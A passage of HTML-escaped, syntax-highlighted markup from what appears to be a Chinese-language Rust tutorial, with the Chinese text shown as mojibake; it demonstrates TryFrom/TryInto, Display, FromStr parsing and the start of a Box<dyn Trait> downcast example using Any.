&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">convert&lt;/span>::&lt;span class="n">TryFrom&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">convert&lt;/span>::&lt;span class="n">TryInto&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="cp">#[derive(Debug, PartialEq)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">EvenNumber&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">i32&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">TryFrom&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">i32&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">EvenNumber&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">type&lt;/span> &lt;span class="nc">Error&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">try_from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>: &lt;span class="kt">i32&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Result&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="bp">Self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">Self&lt;/span>::&lt;span class="n">Error&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EvenNumber&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(())&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// TryFrom
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EvenNumber&lt;/span>::&lt;span class="n">try_from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EvenNumber&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EvenNumber&lt;/span>::&lt;span class="n">try_from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(()));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// TryInto
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>: &lt;span class="nb">Result&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">EvenNumber&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="k">i32&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">try_into&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EvenNumber&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>: &lt;span class="nb">Result&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">EvenNumber&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="k">i32&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">try_into&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(()));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="string-è½¬æ¢">String è½¬æ¢&lt;/h3>
&lt;h4 id="è½¬æ¢æˆ-string-fmt-display">è½¬æ¢æˆ String: &lt;code>fmt::Display&lt;/code>&lt;/h4>
&lt;p>ä¸€ä¸ªç±»å‹è¦è½¬æ¢æˆ &lt;code>String&lt;/code>, ä¸€èˆ¬ä¼šå®ç° &lt;code>fmt::Display&lt;/code> trait, è€Œä¸æ˜¯ &lt;code>ToString&lt;/code> (å‚è€ƒâ€œ&lt;a href="https://mincodes.com/posts/traits-in-rust/#%E4%B8%80%E6%8F%BD%E5%AD%90%E5%AE%9E%E7%8E%B0--blanket-implementations">ä¸€æ½å­å®ç°&lt;/a>â€ä¸­çš„è¯´æ˜):&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">fmt&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Circle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">radius&lt;/span>: &lt;span class="kt">i32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fmt&lt;/span>::&lt;span class="n">Display&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Circle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">fmt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">f&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fmt&lt;/span>::&lt;span class="n">Formatter&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">fmt&lt;/span>::&lt;span class="nb">Result&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">write!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;Circle of radius {}&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">radius&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">circle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Circle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">radius&lt;/span>: &lt;span class="mi">6&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">circle&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">to_string&lt;/span>&lt;span class="p">());&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">Circle of radius 6
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="è§£æ-string-fromstr">è§£æ String: &lt;code>FromStr&lt;/code>&lt;/h4>
&lt;p>ä¸€ä¸ªç±»å‹è¦æ”¯æŒä»ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­è§£æå‡ºæ¥ï¼Œéœ€è¦å®ç° &lt;code>FromStr&lt;/code> trait:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">parsed&lt;/span>: &lt;span class="kt">i32&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;5&amp;#34;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">unwrap&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">turbo_parsed&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;10&amp;#34;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">parse&lt;/span>::&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">i32&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">unwrap&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sum&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">parsed&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">turbo_parsed&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Sum: &lt;/span>&lt;span class="si">{:?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sum&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">Sum: 15
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="box-dyn-trait-çš„-downcast">&lt;code>Box&amp;lt;dyn Trait&amp;gt;&lt;/code> çš„ &lt;code>downcast&lt;/code>&lt;/h3>
&lt;p>æˆ‘æœ‰ä¸€ä¸ª trait çš„åŒ…è£…ç±»å‹ &lt;code>Box&amp;lt;dyn Trait&amp;gt;&lt;/code> çš„å˜é‡ï¼Œå¦‚ä½•è·å¾—å…¶åº•å±‚çš„å…·ä½“ç±»å‹çš„å¼•ç”¨å‘¢ï¼Ÿå³å¦‚ä½•è·å¾—è¯¥å˜é‡å¯¹åº”çš„å®ç°è¯¥ trait çš„ struct çš„å¼•ç”¨å‘¢ï¼Ÿ&lt;/p>
&lt;p>è¿™æ˜¯ä¸€ä¸ª &lt;code>downcast&lt;/code> çš„è¿‡ç¨‹ï¼Œç±»ä¼¼äº C++ ä¸­çš„ &lt;code>dynamic_cast&lt;/code> ã€‚&lt;/p>
&lt;p>Rust ä¸­åº”è¯¥æ€ä¹ˆåšï¼Ÿè¿™å°±è¦ç”¨åˆ°ä¸€ä¸ªå«åš &lt;code>Any&lt;/code> çš„ traitã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">any&lt;/span>::&lt;span class="n">Any&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">trait&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Counter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">inc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">as_any_mut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">dyn&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Any&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">ConcreteCounter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">count&lt;/span>: &lt;span class="kt">u8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ConcreteCounter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
